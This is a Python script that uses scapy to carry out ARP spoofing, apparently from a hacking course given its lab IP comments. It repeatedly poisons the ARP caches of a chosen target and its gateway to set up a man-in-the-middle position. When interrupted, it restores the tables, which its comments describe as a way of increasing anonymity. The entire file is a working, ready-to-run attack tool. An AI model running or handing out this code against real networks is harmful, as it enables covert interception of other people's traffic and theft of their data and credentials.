# Requests and packet flows from the MIM
# Powerful attack

import scapy.all as scapy
import time
import sys
import optparse as op


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip) #sends a packet reuesting mac address to specified [ip]

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #send the request to broadcast thus sending to all PC on network.

    arp_request_broadcast = broadcast/arp_request #clustering the broadcastdest and arp_request together to send

    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False) #the returned list is packed use ans_list.show() or .summary() or a_l[0] to check elements

    return answered_list[0][1].hwsrc #This is the mac_address to check functioning check network_scanner.py | a-list[0] is single ip [1] is element1 and hwsrc is mac


def spoof(target_ip,spoof_ip):

#creating the packet
#use scapy.ls(scapy.ARP()) to check all possible arguments
#op - Arp response . If op = 1 its ARP request
#pdst - ip of target computer - can be obtained using network_scanner.py or >>> netdiscover -r host-ip
#hwdst - MAC address of the target computer
#psrc = Spoof the pdst computer by showing the packet arrived from src = router ip >>route -n

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst = target_mac, psrc= spoof_ip)
    scapy.send(packet,verbose=False)



def restore(dest_ip, source_ip):
#returns arp table to its original state thus increasing anonymity.
#sends single packets to reset everything back to normal.
    source_mac = get_mac(source_ip)
    dest_mac = get_mac(dest_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet,count=4,verbose=False) #count=4 to be double sure it actually does the task




#MAIN

#Parsing inputs from commandline interface
parser = op.OptionParser()
# target_ip
parser.add_option("-t", "--target", dest='t_ip', help="please enter -t [target_ip]")
parser.add_option("-s", "--spoof", dest='g_ip', help="please enter ip needed to spoof")
(options,arguments) = parser.parse_args()

target_ip = options.t_ip
gateway_ip = options.g_ip

packet_counter = 0;

try:
    while(True):

        spoof(target_ip,gateway_ip) #10.0.2.4 , 10.0.2.1
        spoof(gateway_ip,target_ip) #10.0.2.1 , 10.0.2.4
        packet_counter += 2
        print("\r[+]Packets Sent : "+ str(packet_counter)), #adds all packet print statement into the buffer and print after program abort [\r is rewritting every print st.]
        sys.stdout.flush() #flush buffer and print instantly
        time.sleep(2) #so that it does not tell too many packets and overflow it.

except KeyboardInterrupt:

    print("\n[-]Dectected Ctrl-C ..Resetting ARP tables...please wait ")
    restore(target_ip,gateway_ip) #Revert Arp table back to normal
    print("[+]Revert accomplished succesfully")